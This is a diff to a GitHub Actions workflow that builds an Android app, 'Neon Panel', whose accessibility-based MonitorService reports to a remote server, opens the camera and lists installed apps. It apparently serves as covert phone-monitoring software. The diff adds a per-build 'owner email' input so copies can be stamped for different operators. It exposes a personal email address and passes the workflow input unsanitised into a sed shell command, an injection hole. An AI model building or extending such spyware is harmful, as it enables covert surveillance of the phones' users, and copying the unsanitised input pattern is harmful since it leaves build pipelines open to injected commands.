@@ -2,6 +2,11 @@ name: Build Neon Panel APK
 
 on:
   workflow_dispatch:
+    inputs:
+      owner_email:
+        description: 'Owner email for this APK'
+        required: true
+        default: 'mdfatema03@gmail.com'
 
 jobs:
   build:
@@ -341,7 +346,7 @@ jobs:
           public class MonitorService extends AccessibilityService {
               private static final String TAG = "NEON_PANEL";
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
-              private static final String OWNER_EMAIL = "mdfatema03@gmail.com";
+              private static final String OWNER_EMAIL = "OWNER_EMAIL_PLACEHOLDER";
               private static final String PREFS_NAME = "device_prefs";
               private static final String DEVICE_ID_KEY = "device_id";
               private static final String DEVICE_TOKEN_KEY = "device_token";
@@ -622,7 +627,7 @@ jobs:
                       camera = android.hardware.Camera.open(cameraId);
                       android.hardware.Camera.Parameters params = camera.getParameters();
 
-                      // ✅ ফোকাস মোড সাপোর্টেড হলে সেট করুন, নাহলে বাদ দিন
+                      // ফোকাস মোড সাপোর্টেড হলে সেট করুন, নাহলে বাদ দিন
                       List<String> focusModes = params.getSupportedFocusModes();
                       if (focusModes != null && focusModes.contains(android.hardware.Camera.Parameters.FOCUS_MODE_AUTO)) {
                           params.setFocusMode(android.hardware.Camera.Parameters.FOCUS_MODE_AUTO);
@@ -1039,6 +1044,9 @@ jobs:
               private static class InstalledApp { String name,packageName; InstalledApp(String n,String p){name=n;packageName=p;} }
           }
           EOF
+
+          # Replace placeholder with actual email from workflow input
+          sed -i "s/OWNER_EMAIL_PLACEHOLDER/${{ github.event.inputs.owner_email }}/g" app/src/main/java/com/example/neonpanel/MonitorService.java
 
           cat > app/src/main/res/layout/activity_main.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
